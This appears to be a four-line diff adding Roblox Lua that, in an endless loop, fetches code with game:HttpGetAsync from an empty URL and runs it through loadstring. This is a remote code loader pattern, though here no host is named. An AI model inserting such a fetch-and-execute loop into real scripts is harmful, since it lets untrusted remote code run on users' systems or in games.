@@ -1,0 +1,4 @@
+while true do
+task.wait()
+loadstring(game:HttpGetAsync(""))()
+end
